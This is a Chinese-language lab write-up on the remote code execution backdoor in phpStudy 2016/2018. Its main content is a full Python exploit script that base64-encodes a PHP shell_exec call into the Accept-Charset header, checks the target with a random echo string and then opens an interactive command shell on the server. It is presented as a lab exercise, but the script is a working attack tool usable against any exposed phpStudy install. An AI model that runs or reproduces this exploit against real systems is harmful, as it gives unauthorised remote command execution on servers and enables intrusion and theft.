## 实验说明

> 实验环境

- kali Linux
- windows server 2022
- python3

> 实验目标

1. 挖掘安装在靶机windows server 2022上的 php study 环境的rce漏洞；
2. 编写脚本判断是否存在该漏洞，并对漏洞加以利用



## 相关知识

### requests模块

`requests` 是一个用于发送 HTTP 请求的 Python 库，它提供了简洁且易于理解的 API，支持常见的 HTTP 方法、参数设置、响应处理等功能。通过 `requests`，可以轻松地与 Web 服务进行通信，执行各种操作，如获取数据、上传文件、处理身份验证等。



### base64模块

base64 模块就是用来进行base64 编解码操作的模块。



## 实验过程

> 1.漏洞发现

正常访问phpinfo.php

![image-20240325204553220](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240325204553220.png)

我们发现，当我们将命令转换为base64编码，手动加入请求时，会出现如下情况：

![image-20240325204929818](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240325204929818.png)

![image-20240325205042313](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240325205042313.png)

这代表着该php有着rce漏洞；

> 2.编写脚本 PHP_study_2016-18_RCE_EXP.py

1.使用脚本实现判断有无漏洞；

2.对漏洞进行利用；

```py
import requests
import base64
import sys
import random
import string

# 定义横幅
banner = """
-------------------------------------------------------------------------------------------
-  -------------------------------------------------------------------------------------  -  
-  -  PPPP   H   H  PPPP    SSS    TTTTT  U   U  DDDD   YY   YY   RRRR   CCCC   EEEEE  -  -
-  -  P   P  H   H  P   P  S         T    U   U  D   D   YY YY    R   R  C      E      -  -
-  -  PPPP   HHHHH  PPPP    SSS      T    U   U  D   D    YYY     RRRR   C      EEEE   -  -
-  -  P      H   H  P          S     T    U   U  D   D    YYY     R  R   C      E      -  -
-  -  P      H   H  P      SSSSS     T     UUU   DDDD     YYY     R   R  CCCC   EEEEE  -  -
-  -                                                                                   -  -
-  -                                                                                   -  -
-  -            Usage: python3 [py_name].py http://[ip]/phpinfo.php                    -  -
-  -------------------------------------------------------------------------------------  -
-------------------------------------------------------------------------------------------
"""

# 定义攻击函数
def attack(url, cmd):
    # 将命令进行 base64 编码
    cmd = base64.b64encode(f"print(shell_exec('{cmd}'));".encode())
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
        "Accept-Encoding": "gzip,deflate",
        "Accept-Charset": cmd
    }
    try:
        # 发送 GET 请求并获取响应
        res = requests.get(url=url, headers=headers)
        # 解码响应内容并提取有效信息
        html = res.content.decode("gb2312")
        result = html[0:html.index("<!DOCTYPE html")].strip()
        return result
    except Exception as e:
        # 捕获异常并打印错误信息	`
        print(f"[-] An error occurred: {e}")
        return None

# 生成随机字符串
def random_str():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=8))

# 检查目标是否存在漏洞
def check_vuln(url):
    random_s = random_str()
    cmd = f"echo {random_s}"
    # 发起攻击，检查是否返回了随机字符串
    result = attack(url, cmd)
    if result and random_s in result:
        print("[+] The target appears to be VULNERABLE!")
        return True
    else:
        print("[+] The target seems NOT to be VULNERABLE!")
        return False
    
if __name__ == "__main__":
    # 获取命令行参数
    if len(sys.argv) < 2:
        exit(banner)
    url = sys.argv[1]
    # 检查目标是否存在漏洞
    if not check_vuln(url):
        exit()
    act = input("Do you want to continue?[Y/n]")
    if act == 'n':
        exit()
    while True:
        cmd = input("[Please enter cmd]#")
        if cmd == 'q' or cmd == 'quit':
            break
        print(attack(url, cmd))

```

> 执行结果
>

![image-20240325224941093](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240325224941093.png)





